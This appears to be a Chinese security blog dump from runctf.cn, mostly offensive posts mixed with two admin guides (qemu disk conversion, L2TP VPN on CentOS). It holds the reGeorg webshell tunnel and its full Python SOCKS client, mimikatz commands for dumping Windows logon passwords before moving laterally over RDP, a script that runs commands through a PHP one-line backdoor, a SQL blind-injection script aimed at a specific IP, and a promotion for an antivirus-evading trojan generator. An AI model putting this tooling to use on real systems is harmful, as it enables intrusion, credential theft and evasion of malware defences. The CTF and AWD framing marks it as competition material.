header(&#x27;X-STATUS: FAIL&#x27;); header(&#x27;X-ERROR: Failed writing socket&#x27;); &#125; &#125; # stream_set_timeout($res, 1); stream_set_blocking($res, false); while ($o = fgets($res, 10)) &#123; if($o === false) &#123; @session_start(); $_SESSION[&quot;run&quot;] = false; session_write_close(); header(&#x27;X-STATUS: FAIL&#x27;); header(&#x27;X-ERROR: Failed reading from socket&#x27;); &#125; $readBuff .= $o; &#125; if ($readBuff!=&quot;&quot;)&#123; @session_start(); $_SESSION[&quot;readbuf&quot;] .= $readBuff; session_write_close(); &#125; #sleep(0.2); &#125; fclose($res); &#125; break; case &quot;DISCONNECT&quot;: &#123; error_log(&quot;DISCONNECT recieved&quot;); @session_start(); $_SESSION[&quot;run&quot;] = false; session_write_close(); return; &#125; break; case &quot;READ&quot;: &#123; @session_start(); $readBuffer = $_SESSION[&quot;readbuf&quot;]; $_SESSION[&quot;readbuf&quot;]=&quot;&quot;; $running = $_SESSION[&quot;run&quot;]; session_write_close(); if ($running) &#123; header(&#x27;X-STATUS: OK&#x27;); header(&quot;Connection: Keep-Alive&quot;); echo $readBuffer; return; &#125; else &#123; header(&#x27;X-STATUS: FAIL&#x27;); header(&#x27;X-ERROR: RemoteSocket read filed&#x27;); return; &#125; &#125; break; case &quot;FORWARD&quot;: &#123; @session_start(); $running = $_SESSION[&quot;run&quot;]; session_write_close(); if(!$running)&#123; header(&#x27;X-STATUS: FAIL&#x27;); header(&#x27;X-ERROR: No more running, close now&#x27;); return; &#125; header(&#x27;Content-Type: application/octet-stream&#x27;); $rawPostData = file_get_contents(&quot;php://input&quot;); if ($rawPostData) &#123; @session_start(); $_SESSION[&quot;writebuf&quot;] .= $rawPostData; session_write_close(); header(&#x27;X-STATUS: OK&#x27;); header(&quot;Connection: Keep-Alive&quot;); return; &#125; else &#123; header(&#x27;X-STATUS: FAIL&#x27;); header(&#x27;X-ERROR: POST request read filed&#x27;); &#125; &#125; break; &#125;&#125;?&gt; 如图所示启用成功: 使用全局代理工具(Proxifier)进行代理: 1,起用python监听脚本(使用python2.7版本): 1python reGeorgSocksProxy.py -u http://&#123;xxx.php&#125;地址 -p 本地监听端口 源码: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430#!/usr/bin/env python# -*- coding: utf-8 -*-import loggingimport argparseimport urllib3from threading import Threadfrom urlparse import urlparsefrom socket import *from threading import Threadfrom time import sleep# ConstantsSOCKTIMEOUT = 5RESENDTIMEOUT = 300VER = &quot;\\x05&quot;METHOD = &quot;\\x00&quot;SUCCESS = &quot;\\x00&quot;SOCKFAIL = &quot;\\x01&quot;NETWORKFAIL = &quot;\\x02&quot;HOSTFAIL = &quot;\\x04&quot;REFUSED = &quot;\\x05&quot;TTLEXPIRED = &quot;\\x06&quot;UNSUPPORTCMD = &quot;\\x07&quot;ADDRTYPEUNSPPORT = &quot;\\x08&quot;UNASSIGNED = &quot;\\x09&quot;BASICCHECKSTRING = &quot;Georg says, &#x27;All seems fine&#x27;&quot;# GlobalsREADBUFSIZE = 1024# LoggingRESET_SEQ = &quot;\\033[0m&quot;COLOR_SEQ = &quot;\\033[1;%dm&quot;BOLD_SEQ = &quot;\\033[1m&quot;BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)LEVEL = &#123;&quot;INFO&quot;: logging.INFO, &quot;DEBUG&quot;: logging.DEBUG, &#125;logLevel = &quot;INFO&quot;COLORS = &#123; &#x27;WARNING&#x27;: YELLOW, &#x27;INFO&#x27;: WHITE, &#x27;DEBUG&#x27;: BLUE, &#x27;CRITICAL&#x27;: YELLOW, &#x27;ERROR&#x27;: RED, &#x27;RED&#x27;: RED, &#x27;GREEN&#x27;: GREEN, &#x27;YELLOW&#x27;: YELLOW, &#x27;BLUE&#x27;: BLUE, &#x27;MAGENTA&#x27;: MAGENTA, &#x27;CYAN&#x27;: CYAN, &#x27;WHITE&#x27;: WHITE,&#125;def formatter_message(message, use_color=True): if use_color: message = message.replace(&quot;$RESET&quot;, RESET_SEQ).replace(&quot;$BOLD&quot;, BOLD_SEQ) else: message = message.replace(&quot;$RESET&quot;, &quot;&quot;).replace(&quot;$BOLD&quot;, &quot;&quot;) return messageclass ColoredFormatter(logging.Formatter): def __init__(self, msg, use_color=True): logging.Formatter.__init__(self, msg) self.use_color = use_color def format(self, record): levelname = record.levelname if self.use_color and levelname in COLORS: levelname_color = COLOR_SEQ % (30 + COLORS[levelname]) + levelname + RESET_SEQ record.levelname = levelname_color return logging.Formatter.format(self, record)class ColoredLogger(logging.Logger): def __init__(self, name): FORMAT = &quot;[$BOLD%(levelname)-18s$RESET] %(message)s&quot; COLOR_FORMAT = formatter_message(FORMAT, True) logging.Logger.__init__(self, name, logLevel) if (name == &quot;transfer&quot;): COLOR_FORMAT = &quot;\\x1b[80D\\x1b[1A\\x1b[K%s&quot; % COLOR_FORMAT color_formatter = ColoredFormatter(COLOR_FORMAT) console = logging.StreamHandler() console.setFormatter(color_formatter) self.addHandler(console) returnlogging.setLoggerClass(ColoredLogger)log = logging.getLogger(__name__)transferLog = logging.getLogger(&quot;transfer&quot;)class SocksCmdNotImplemented(Exception): passclass SocksProtocolNotImplemented(Exception): passclass RemoteConnectionFailed(Exception): passclass session(Thread): def __init__(self, pSocket, connectString): Thread.__init__(self) self.pSocket = pSocket self.connectString = connectString o = urlparse(connectString) try: self.httpPort = o.port except: if o.scheme == &quot;https&quot;: self.httpPort = 443 else: self.httpPort = 80 self.httpScheme = o.scheme self.httpHost = o.netloc.split(&quot;:&quot;)[0] self.httpPath = o.path self.cookie = None if o.scheme == &quot;http&quot;: self.httpScheme = urllib3.HTTPConnectionPool else: self.httpScheme = urllib3.HTTPSConnectionPool def parseSocks5(self, sock): log.debug(&quot;SocksVersion5 detected&quot;) nmethods, methods = (sock.recv(1), sock.recv(1)) sock.sendall(VER + METHOD) ver = sock.recv(1) if ver == &quot;\\x02&quot;: # this is a hack for proxychains ver, cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1), sock.recv(1)) else: cmd, rsv, atyp = (sock.recv(1), sock.recv(1), sock.recv(1)) target = None targetPort = None if atyp == &quot;\\x01&quot;: # IPv4 # Reading 6 bytes for the IP and Port target = sock.recv(4) targetPort = sock.recv(2) target = &quot;.&quot; .join([str(ord(i)) for i in target]) elif atyp == &quot;\\x03&quot;: # Hostname targetLen = ord(sock.recv(1)) # hostname length (1 byte) target = sock.recv(targetLen) targetPort = sock.recv(2) target = &quot;&quot;.join([unichr(ord(i)) for i in target]) elif atyp == &quot;\\x04&quot;: # IPv6 target = sock.recv(16) targetPort = sock.recv(2) tmp_addr = [] for i in xrange(len(target) / 2): tmp_addr.append(unichr(ord(target[2 * i]) * 256 + ord(target[2 * i + 1]))) target = &quot;:&quot;.join(tmp_addr) targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1]) if cmd == &quot;\\x02&quot;: # BIND raise SocksCmdNotImplemented(&quot;Socks5 - BIND not implemented&quot;) elif cmd == &quot;\\x03&quot;: # UDP raise SocksCmdNotImplemented(&quot;Socks5 - UDP not implemented&quot;) elif cmd == &quot;\\x01&quot;: # CONNECT serverIp = target try: serverIp = gethostbyname(target) except: log.error(&quot;oeps&quot;) serverIp = &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)]) self.cookie = self.setupRemoteSession(target, targetPort) if self.cookie: sock.sendall(VER + SUCCESS + &quot;\\x00&quot; + &quot;\\x01&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) return True else: sock.sendall(VER + REFUSED + &quot;\\x00&quot; + &quot;\\x01&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) raise RemoteConnectionFailed(&quot;[%s:%d] Remote failed&quot; % (target, targetPort)) raise SocksCmdNotImplemented(&quot;Socks5 - Unknown CMD&quot;) def parseSocks4(self, sock): log.debug(&quot;SocksVersion4 detected&quot;) cmd = sock.recv(1) if cmd == &quot;\\x01&quot;: # Connect targetPort = sock.recv(2) targetPort = ord(targetPort[0]) * 256 + ord(targetPort[1]) target = sock.recv(4) sock.recv(1) target = &quot;.&quot;.join([str(ord(i)) for i in target]) serverIp = target try: serverIp = gethostbyname(target) except: log.error(&quot;oeps&quot;) serverIp = &quot;&quot;.join([chr(int(i)) for i in serverIp.split(&quot;.&quot;)]) self.cookie = self.setupRemoteSession(target, targetPort) if self.cookie: sock.sendall(chr(0) + chr(90) + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) return True else: sock.sendall(&quot;\\x00&quot; + &quot;\\x91&quot; + serverIp + chr(targetPort / 256) + chr(targetPort % 256)) raise RemoteConnectionFailed(&quot;Remote connection failed&quot;) else: raise SocksProtocolNotImplemented(&quot;Socks4 - Command [%d] Not implemented&quot; % ord(cmd)) def handleSocks(self, sock): # This is where we setup the socks connection ver = sock.recv(1) if ver == &quot;\\x05&quot;: return self.parseSocks5(sock) elif ver == &quot;\\x04&quot;: return self.parseSocks4(sock) def setupRemoteSession(self, target, port): headers = &#123;&quot;X-CMD&quot;: &quot;CONNECT&quot;, &quot;X-TARGET&quot;: target, &quot;X-PORT&quot;: port&#125; self.target = target self.port = port cookie = None conn = self.httpScheme(host=self.httpHost, port=self.httpPort) # response = conn.request(&quot;POST&quot;, self.httpPath, params, headers) response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=connect&amp;target=%s&amp;port=%d&quot; % (target, port), headers=headers, body=&quot;&quot;) if response.status == 200: status = response.getheader(&quot;x-status&quot;) if status == &quot;OK&quot;: cookie = response.getheader(&quot;set-cookie&quot;) log.info(&quot;[%s:%d] HTTP [200]: cookie [%s]&quot; % (self.target, self.port, cookie)) else: if response.getheader(&quot;X-ERROR&quot;) is not None: log.error(response.getheader(&quot;X-ERROR&quot;)) else: log.error(&quot;[%s:%d] HTTP [%d]: [%s]&quot; % (self.target, self.port, response.status, response.getheader(&quot;X-ERROR&quot;))) log.error(&quot;[%s:%d] RemoteError: %s&quot; % (self.target, self.port, response.data)) conn.close() return cookie def closeRemoteSession(self): headers = &#123;&quot;X-CMD&quot;: &quot;DISCONNECT&quot;, &quot;Cookie&quot;: self.cookie&#125; params = &quot;&quot; conn = self.httpScheme(host=self.httpHost, port=self.httpPort) response = conn.request(&quot;POST&quot;, self.httpPath + &quot;?cmd=disconnect&quot;, params, headers) if response.status == 200: log.info(&quot;[%s:%d] Connection Terminated&quot; % (self.target, self.port)) conn.close() def reader(self): conn = urllib3.PoolManager() while True: try: if not self.pSocket: break data = &quot;&quot; headers = &#123;&quot;X-CMD&quot;: &quot;READ&quot;, &quot;Cookie&quot;: self.cookie, &quot;Connection&quot;: &quot;Keep-Alive&quot;&#125; response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=read&quot;, headers=headers, body=&quot;&quot;) data = None if response.status == 200: status = response.getheader(&quot;x-status&quot;) if status == &quot;OK&quot;: if response.getheader(&quot;set-cookie&quot;) is not None: cookie = response.getheader(&quot;set-cookie&quot;) data = response.data # Yes I know this is horrible, but its a quick fix to issues with tomcat 5.x bugs that have been reported, will find a propper fix laters try: if response.getheader(&quot;server&quot;).find(&quot;Apache-Coyote/1.1&quot;) &gt; 0: data = data[:len(data) - 1] except: pass if data is None: data = &quot;&quot; else: data = None log.error(&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot; % (self.target, self.port, response.status, status, response.getheader(&quot;X-ERROR&quot;))) else: log.error(&quot;[%s:%d] HTTP [%d]: Shutting down&quot; % (self.target, self.port, response.status)) if data is None: # Remote socket closed break if len(data) == 0: sleep(0.1) continue transferLog.info(&quot;[%s:%d] &lt;&lt;&lt;&lt; [%d]&quot; % (self.target, self.port, len(data))) self.pSocket.send(data) except Exception, ex: raise ex self.closeRemoteSession() log.debug(&quot;[%s:%d] Closing localsocket&quot; % (self.target, self.port)) try: self.pSocket.close() except: log.debug(&quot;[%s:%d] Localsocket already closed&quot; % (self.target, self.port)) def writer(self): global READBUFSIZE conn = urllib3.PoolManager() while True: try: self.pSocket.settimeout(1) data = self.pSocket.recv(READBUFSIZE) if not data: break headers = &#123;&quot;X-CMD&quot;: &quot;FORWARD&quot;, &quot;Cookie&quot;: self.cookie, &quot;Content-Type&quot;: &quot;application/octet-stream&quot;, &quot;Connection&quot;: &quot;Keep-Alive&quot;&#125; response = conn.urlopen(&#x27;POST&#x27;, self.connectString + &quot;?cmd=forward&quot;, headers=headers, body=data) if response.status == 200: status = response.getheader(&quot;x-status&quot;) if status == &quot;OK&quot;: if response.getheader(&quot;set-cookie&quot;) is not None: self.cookie = response.getheader(&quot;set-cookie&quot;) else: log.error(&quot;[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down&quot; % (self.target, self.port, response.status, status, response.getheader(&quot;x-error&quot;))) break else: log.error(&quot;[%s:%d] HTTP [%d]: Shutting down&quot; % (self.target, self.port, response.status)) break transferLog.info(&quot;[%s:%d] &gt;&gt;&gt;&gt; [%d]&quot; % (self.target, self.port, len(data))) except timeout: continue except Exception, ex: raise ex break self.closeRemoteSession() log.debug(&quot;Closing localsocket&quot;) try: self.pSocket.close() except: log.debug(&quot;Localsocket already closed&quot;) def run(self): try: if self.handleSocks(self.pSocket): log.debug(&quot;Staring reader&quot;) r = Thread(target=self.reader, args=()) r.start() log.debug(&quot;Staring writer&quot;) w = Thread(target=self.writer, args=()) w.start() r.join() w.join() except SocksCmdNotImplemented, si: log.error(si.message) self.pSocket.close() except SocksProtocolNotImplemented, spi: log.error(spi.message) self.pSocket.close() except Exception, e: log.error(e.message) self.closeRemoteSession() self.pSocket.close()def askGeorg(connectString): connectString = connectString o = urlparse(connectString) try: httpPort = o.port except: if o.scheme == &quot;https&quot;: httpPort = 443 else: httpPort = 80 httpScheme = o.scheme httpHost = o.netloc.split(&quot;:&quot;)[0] httpPath = o.path if o.scheme == &quot;http&quot;: httpScheme = urllib3.HTTPConnectionPool else: httpScheme = urllib3.HTTPSConnectionPool conn = httpScheme(host=httpHost, port=httpPort) response = conn.request(&quot;GET&quot;, httpPath) if response.status == 200: if BASICCHECKSTRING == response.data.strip(): log.info(BASICCHECKSTRING) return True conn.close() return Falseif __name__ == &#x27;__main__&#x27;: print &quot;&quot;&quot;\\033[1m \\033[1;33m _____ _____ ______ __|___ |__ ______ _____ _____ ______ | | | ___|| ___| || ___|/ \\| | | ___| | \\ | ___|| | | || ___|| || \\ | | | |__|\\__\\|______||______| __||______|\\_____/|__|\\__\\|______| |_____| ... every office needs a tool like Georg willem@sensepost.com / @_w_m__ sam@sensepost.com / @trowalts etienne@sensepost.com / @kamp_staaldraad \\033[0m &quot;&quot;&quot; log.setLevel(logging.DEBUG) parser = argparse.ArgumentParser(description=&#x27;Socks server for reGeorg HTTP(s) tunneller&#x27;) parser.add_argument(&quot;-l&quot;, &quot;--listen-on&quot;, metavar=&quot;&quot;, help=&quot;The default listening address&quot;, default=&quot;127.0.0.1&quot;) parser.add_argument(&quot;-p&quot;, &quot;--listen-port&quot;, metavar=&quot;&quot;, help=&quot;The default listening port&quot;, type=int, default=&quot;8888&quot;) parser.add_argument(&quot;-r&quot;, &quot;--read-buff&quot;, metavar=&quot;&quot;, help=&quot;Local read buffer, max data to be sent per POST&quot;, type=int, default=&quot;1024&quot;) parser.add_argument(&quot;-u&quot;, &quot;--url&quot;, metavar=&quot;&quot;, required=True, help=&quot;The url containing the tunnel script&quot;) parser.add_argument(&quot;-v&quot;, &quot;--verbose&quot;, metavar=&quot;&quot;, help=&quot;Verbose output[INFO|DEBUG]&quot;, default=&quot;INFO&quot;) args = parser.parse_args() if (args.verbose in LEVEL): log.setLevel(LEVEL[args.verbose]) log.info(&quot;Log Level set to [%s]&quot; % args.verbose) log.info(&quot;Starting socks server [%s:%d], tunnel at [%s]&quot; % (args.listen_on, args.listen_port, args.url)) log.info(&quot;Checking if Georg is ready&quot;) if not askGeorg(args.url): log.info(&quot;Georg is not ready, please check url&quot;) exit() READBUFSIZE = args.read_buff servSock = socket(AF_INET, SOCK_STREAM) servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1) servSock.bind((args.listen_on, args.listen_port)) servSock.listen(1000) while True: try: sock, addr_info = servSock.accept() sock.settimeout(SOCKTIMEOUT) log.debug(&quot;Incomming connection&quot;) session(sock, args.url).start() except KeyboardInterrupt, ex: break except Exception, e: log.error(e) servSock.close() 在webshell命令行使用： 123查看内网地址ipconfig使用远程桌面连接 使用工具(mimikatz.exe)抓取密码: 123privilege::debug 提升权限sekurlsa::logonpasswords 抓取密码log 日志会记录内容 1234567打开windows-cmdmimikatz.exe进入后使用启用日志功能,会在目录下输出mimikatz.log文件log提升权限后,抓取密码，查看管理员密码，用远程桌面进行登录.安装nmap进行内网扫码.在内网中很多机器是使用同一密码可以一次测试.","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://runctf.cn/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"利用一句话获取自动获取flag","slug":"AWD获取flag脚本","date":"2022-10-24T14:16:01.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"2022/10/24/AWD获取flag脚本/","link":"","permalink":"http://runctf.cn/2022/10/24/AWD%E8%8E%B7%E5%8F%96flag%E8%84%9A%E6%9C%AC/","excerpt":"","text":"注意事项： 1，此脚本支持post-get两种一句话木马传参。 2，使用后会在目录生成txt文件，查看txt文件即可获取flag。 3，次脚本只限在AWD攻防中使用。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pdb import post_mortemfrom turtle import posfrom urllib import requestimport requestsimport reflag = &quot;cat flag.txt&quot; # 需要执行的命令flag1 = &quot;cat flag1.txt&quot;flag_1 = &quot;http://192.168.20.140/&quot; # 目标urlflag_2 = &quot;index.php?&quot; # 木马地址flag_3 = &quot;a&quot; # 连接密码flag_4 = &quot;=system(%27&quot;+flag+&quot;%27);&quot; # Get需要执行的命令flag_5 = &quot;system(&#x27;&quot;+flag1+&quot;&#x27;);&quot; # Post需要执行的命令list = [] # 获取flag的传递值def get(): response = requests.get(flag_1 + flag_2) response = response.status_code # 返回url响应值 twohundred = 200 if response == twohundred: # 判断response的响应值是否未200 flag_6 = requests.get(flag_1 + flag_2 + flag_3 + flag_4) #print(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text)) # 获取flag长度 list.append(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text).group(0)[:13]) else: print(2)def post(): data = &#123;flag_3:flag_5&#125; response = requests.post(flag_1+flag_2) response = response.status_code # 返回url响应值 twohundred = 200 if response == twohundred: # 判断response的响应值是否未200 flag_6 = requests.post(flag_1+flag_2,data=data) #print(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text)) # 获取flag长度 list.append(re.search(&quot;flag&#123;.*&#125;&quot;, flag_6.text).group(0)[:13]) else: print(2)get()post()if list[0] == list[1]: #print(list[0]) Note=open(&#x27;flag.txt&#x27;,mode=&#x27;w&#x27;) Note.write(list[0]+&quot; \\n&quot;)else: for i in range(0,2): #print(list[i]) Note=open(&#x27;flag.txt&#x27;,mode=&#x27;w&#x27;) Note.write(list[0]+&quot; \\n&quot;) Note.write(list[i]+&quot; \\n&quot;)","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://runctf.cn/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"SQL注入盲注脚本","slug":"SQL盲注脚本","date":"2022-10-24T14:16:01.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"2022/10/24/SQL盲注脚本/","link":"","permalink":"http://runctf.cn/2022/10/24/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/","excerpt":"","text":"本脚本仅限于靶场使用，请勿用于未授权的违法攻击！！用户滥用造成的一切后果自负！！使用者请务必遵守当地法律！！ 123456789101112131415161718192021222324252627282930313233import requestsimport timeurl = &quot;http://1.14.71.254:28939/index.php&quot;flag = &#x27;&#x27;if __name__ == &quot;__main__&quot;: for i in range(1, 100): mina = 33 maxa = 130 mid = int((maxa - mina) / 2) while True: payload = &#123; &#x27;id&#x27;: &#x27;0^&#x27; + &#x27;(ascii(substr((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;)&#x27;.format(i, mid) &#125; print(payload) res = requests.post(url=url, data=payload).text time.sleep(0.005) # print(res) if &#x27;Hello&#x27; in res: mina = mid mid = int((maxa + mina) / 2) else: maxa = mid mid = int((maxa + mina) / 2) print(&quot;此时的最大值为&#123;&#125;, 最小值为&#123;&#125;, 中间值为&#123;&#125;&quot;.format(maxa,mina,mid)) if (maxa-mina) &lt;= 1: flag += chr(maxa) print(flag) break if &#x27;&#125;&#x27; in flag: break","categories":[],"tags":[{"name":"技术","slug":"技术","permalink":"http://runctf.cn/tags/%E6%8A%80%E6%9C%AF/"}]},{"title":"IMG转VMdk","slug":"imggovmdk","date":"2022-10-24T14:16:01.000Z","updated":"2023-01-11T16:35:33.800Z","comments":true,"path":"2022/10/24/imggovmdk/","link":"","permalink":"http://runctf.cn/2022/10/24/imggovmdk/","excerpt":"","text":"主要命令： 12.\\qemu-img.exe info &#x27;源文件&#x27;.\\qemu-img.exe convert -f qcow2 -O vmdk &#x27;源文件&#x27; &#x27;目标文件.vmdk&#x27; 下载qemu 使用powershell进行转换 12.\\qemu-img.exe info &#x27;源文件&#x27;.\\qemu-img.exe convert -f qcow2 -O vmdk &#x27;源文件&#x27; &#x27;目标文件.vmdk&#x27; 转换成功导入虚拟机","categories":[],"tags":[]},{"title":"Centos7-L2TP VPN","slug":"L2TPVPN","date":"2022-10-23T14:16:01.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"2022/10/23/L2TPVPN/","link":"","permalink":"http://runctf.cn/2022/10/23/L2TPVPN/","excerpt":"","text":"什么是L2TPVPNL2TP VPN概述 什么是L2TP？ L2TP代表第2层隧道协议，它本身不提供任何加密。 L2TP VPN通常使用身份验证协议IPSec（Internet协议安全性）进行强大的加密和身份验证，这使其在某些其他最常用的协议（如PPTP）上具有最终优势。 L2TP协议使用UDP端口1701。 L2TP如何工作？ 通过L2TP &#x2F; IPSec协议传输的数据通常会进行两次身份验证。经由隧道传输的每个数据包均包含L2TP报头。结果，数据被伺服器解复用。数据的双重身份验证会降低性能，但是确实提供了最高的安全性。 1.配置yum源123456789101112131415yum服务cd /etc/yum.repos.d/lsrm -rf *vi dvd.repo[dvd]name=dvdbaseurl=file:///dvdgpgcheck=0enabled=1​mkdir /dvdmount /dev/cdrom /dvd​yum install -y 服务 2.修改成网络源123456789下载阿里云wget -O /etc/yum.repos.d/CentOS-Base-epel.repo http://mirrors.aliyun.com/repo/Centos-7.repo清理缓存yum clean all重新生成缓存yum makecache​安装EPEL源（CentOS7官方源中已经去掉了xl2tpd）yum install -y epel-release 3.安装依赖包1234567​yum install -y make gcc gmp-devel xmlto bison flex xmlto libpcap-devel lsof vim-enhanced man​yum install -y xl2tpd​​yum install -y libreswan 4、修改ipsec的配置文件1vim /etc/ipsec.conf（只添加一行nat_traversal=yes即可） 5、建立ipsec 与 l2tp 服务关联的配置文件12345678910111213141516171819202122vim /etc/ipsec.d/l2tp_psk.conf​conn L2TP-PSK-NAT rightsubnet=vhost:%priv also=L2TP-PSK-noNATconn L2TP-PSK-noNAT authby=secret pfs=no auto=add keyingtries=3 dpddelay=30 dpdtimeout=120 dpdaction=clear rekey=no ikelifetime=8h keylife=1h type=transport left=192.168.0.200 ###192.168.0.200 是自己的网卡Ip地址 leftprotoport=17/1701 right=%any rightprotoport=17/%any​ 6、当建立l2tp连接时，需要输入预共享密匙，以下为预共享密匙的配置文件。12345#如果这个文件也没有也需要手动创建，访问的IP地址和密码vim /etc/ipsec.d/ipsec.secrets​#include /etc/ipsec.d/*.secrets192.168.0.200 %any: PSK &quot;123456789&quot; 7、修改内核支持，可以对照以下配置修改，修改完后运行sysctl -p 使配置生效123456789101112131415161718192021cat /etc/sysctl.conf​vim /etc/sysctl.conf​net.ipv4.ip_forward = 1net.ipv4.conf.default.accept_redirects = 0net.ipv4.conf.default.send_redirects = 0net.ipv4.conf.eno16777736.rp_filter = 0net.ipv4.conf.default.rp_filter = 0​sysctl -pnet.ipv4.ip_forward = 1net.ipv4.conf.all.accept_redirects = 0net.ipv4.conf.all.rp_filter = 0net.ipv4.conf.all.send_redirects = 0net.ipv4.conf.default.accept_redirects = 0net.ipv4.conf.default.rp_filter = 0net.ipv4.conf.default.send_redirects = 0net.ipv4.conf.lo.accept_redirects = 0net.ipv4.conf.lo.rp_filter = 0net.ipv4.conf.lo.send_redirects = 0 8、检验ipsec服务配置123456#重启ipsecsystemctl restart ipsec#检验ipsec服务配置 ipsec verifysystemctl status ipsec 9、启动服务12345#启动ipsec systemctl start ipsec#设置为开机自启 systemctl enable ipsec 10、修改L2tp的配置文件123456789101112131415vim /etc/xl2tpd/xl2tpd.conf [global] listen-addr = 192.168.0.197 ###本机外网网卡IP ipsec saref = yes ###取消注释[lns default]ip range = 192.168.0.128-192.168.0.254local ip = 192.168.0.99require chap = yesrefuse pap = yesrequire authentication = yesname = Linux×××serverppp debug = yespppoptfile = /etc/ppp/options.xl2tpdlength bit = yes 11、修改xl2tpd属性配置文件12345678910111213141516171819vim /etc/ppp/options.xl2tpdrequire-mschap-v2 ###添加此行ipcp-accept-localipcp-accept-remote#dns 写自己的网卡DNS ，写成8.8.8.8也行ms-dns 192.168.0.2 #ms-dns 8.8.8.8noccpauthcrtsctsidle 1800mtu 1410mru 1410nodefaultroutedebuglockproxyarpconnect-delay 5000 12、添加用户名和密码（**登录的用户名和密码12345vim /etc/ppp/chap-secrets# Secrets for authentication using CHAP# client server secret IP addressestest * 123 * 13、iptables安装配置1.安装iptable iptable-service12yum install -y iptablesyum install iptables-services 2.禁用&#x2F;停止自带的firewalld服务12345#停止firewalld服务systemctl stop firewalld#冻结firewalld服务systemctl mask firewalld 3设置现有规则1234567891011121314#查看iptables现有规则iptables -L -n#先允许所有,不然有可能会杯具iptables -P INPUT ACCEPT#清空所有默认规则iptables -F#清空所有自定义规则iptables -X#所有计数器归0iptables -Z 4.开启地址转换(eth0为外网网卡，根据实际情况替换12345678910111213141516iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eno16777736 -j MASQUERADEiptables -I FORWARD -s 192.168.0.0/24 -j ACCEPTiptables -I FORWARD -d 192.168.0.0/24 -j ACCEPT iptables -A INPUT -p udp -m policy --dir in --pol ipsec -m udp --dport 1701 -j ACCEPTiptables -A INPUT -p udp -m udp --dport 1701 -j ACCEPTiptables -A INPUT -p udp -m udp --dport 500 -j ACCEPTiptables -A INPUT -p udp -m udp --dport 4500 -j ACCEPTiptables -A INPUT -p esp -j ACCEPTiptables -A INPUT -m policy --dir in --pol ipsec -j ACCEPT iptables -A FORWARD -i ppp+ -m state --state NEW,RELATED,ESTABLISHED -j ACCEPTiptables -A FORWARD -m state --state RELATED,ESTABLISHED -j ACCEPT service iptables save/bin/systemctl restart iptables.service 14、完成服务配置12345678#启动xl2tp服务 systemctl start xl2tpd #设置开机自启 systemctl enable xl2tpd #查看状态 systemctl status xl2tpd 作者QQ：2565543706","categories":[],"tags":[]},{"title":"红队专用免杀木马生成工具","slug":"cuiri","date":"2022-10-17T04:16:01.000Z","updated":"2023-01-11T16:35:33.792Z","comments":true,"path":"2022/10/17/cuiri/","link":"","permalink":"http://runctf.cn/2022/10/17/cuiri/","excerpt":"","text":"摧日：CuiRi 红队专用免杀木马生成工具 0x01 简介：123456789 ____ __ __ _____ ______ _____ / ___) ) ) ( ( (_ _) ( __ \\ (_ _) / / ( ( ) ) | | ) (__) ) | | ( ( ) ) ( ( | | ( __/ | | ( ( ( ( ) ) | | ) \\ \\ _ | | \\ \\___ ) \\__/ ( _| |__ ( ( \\ \\_)) _| |__ \\____) \\______/ /_____( )_) \\__/ /_____( 摧日：一款红队专用免杀木马生成器，基于shellcode生成绕过所有杀软的木马 CuiRi 是一款红队专用免杀木马生成器，该工具可以通过红队人员提供的一段 shellcode 快速生成一个绕过所有杀软的可执行木马。 特点 1.基于 Syscall 进行免杀，且随机混淆，可过几乎所有杀软 2.内置 go-strip 对 Go 生成的木马进行编译信息抹除与程序信息混淆 3.工具本体只有 1 个 exe，搭配 Go 环境即可直接使用 感谢 go-strip 作者 @boy-hack 0x02 使用：从 release 中下载二进制文件，并且在系统上安装 Go 语言环境，然后将 shellcode 保存到1个txt文件中，即可使用本工具生成免杀马。 123456789101112131415161718192021 ____ __ __ _____ ______ _____ / ___) ) ) ( ( (_ _) ( __ \\ (_ _) / / ( ( ) ) | | ) (__) ) | |( ( ) ) ( ( | | ( __/ | |( ( ( ( ) ) | | ) \\ \\ _ | | \\ \\___ ) \\__/ ( _| |__ ( ( \\ \\_)) _| |__ \\____) \\______/ /_____( )_) \\__/ 